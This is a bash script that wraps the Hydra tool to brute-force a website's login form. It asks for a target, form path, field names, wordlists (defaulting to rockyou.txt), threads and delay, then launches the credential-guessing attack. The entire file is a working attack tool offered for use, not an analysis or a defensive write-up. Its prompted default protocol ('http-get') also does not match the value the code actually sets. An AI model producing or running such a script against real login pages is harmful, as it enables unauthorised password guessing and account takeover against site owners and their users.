#!/bin/bash

# Prompt user for target website and protocol
read -p "Enter target website URL or IP: " target
read -p "Enter target protocol (default: http-get): " protocol
protocol=${protocol:-http-form-get}

# Prompt user for form path, username variable, and password variable
read -p "Enter form path (e.g., /login.php): " form_path
read -p "Enter username variable (default: username): " username_var
username_var=${username_var:-username}
read -p "Enter password variable (default: password): " password_var
password_var=${password_var:-password}

# Prompt user for wordlists for usernames and passwords
read -p "Enter path to username wordlist (default: /usr/share/wordlists/users.txt): " userlist
userlist=${userlist:-/usr/share/wordlists/users.txt}
read -p "Enter path to password wordlist (default: /usr/share/wordlists/rockyou.txt): " passlist
passlist=${passlist:-/usr/share/wordlists/rockyou.txt}

# Prompt user for number of threads and delay time
read -p "Enter number of threads to use (default: 16): " threads
threads=${threads:-16}
read -p "Enter delay time in seconds (default: 30): " delay
delay=${delay:-30}

# Run Hydra command with specified parameters
hydra "$target" "$protocol" "$form_path:$username_var=^USER^&$password_var=^PASS^:Login failed" -L "$userlist" -P "$passlist" -t "$threads" -w "$delay"
